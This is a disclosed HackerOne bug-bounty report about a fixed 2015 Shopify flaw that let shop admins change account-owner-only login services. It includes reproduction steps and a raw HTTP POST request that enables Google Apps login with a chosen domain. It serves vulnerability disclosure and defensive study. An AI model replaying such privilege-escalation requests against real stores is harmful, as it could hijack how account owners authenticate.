---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '56626'
original_report_id: '56626'
title: Shop admin can change external login services
weakness: Privilege Escalation
team_handle: shopify
created_at: '2015-04-16T09:53:14.564Z'
disclosed_at: '2015-10-02T03:34:59.280Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 3
tags:
- hackerone
- privilege-escalation
---

# Shop admin can change external login services

## Metadata

- HackerOne Report ID: 56626
- Weakness: Privilege Escalation
- Program: shopify
- Disclosed At: 2015-10-02T03:34:59.280Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

'Login services' section in the Settings->Account is accessible only to the Account owners. However, shop admins (full access users) can escalate privileges and modify the login services.

To verify,
1. Log into https://seclearn.myshopify.com as admin.
2. Navigate to settings->Account, notice that it does not show Login Services section to this user. However, he can modify the Login Services by sending the below request (use proper authenticity_token and cookies before sending the request).

	POST /admin/login_services/google_apps/update HTTP/1.1
	Host: seclearn.myshopify.com
	User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64; rv:37.0) Gecko/20100101 Firefox/37.0
	Cookie: ...
	Content-Type: application/x-www-form-urlencoded
	
	utf8=%E2%9C%93&_method=patch&authenticity_token=xxxxxPaAQQFSKgdwaJr6XWqFbBkQ%3D&shop%5Bgoogle_apps_login_enabled%5D=0&shop%5Bgoogle_apps_login_enabled%5D=1&shop%5Bgoogle_apps_domain%5D=securitylearn.net&commit=Save


3. To confirm, log in as Account owner and look at the Login Services section. Notice that, Google apps are enabled and securitylearn.net is added to the google app domain.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
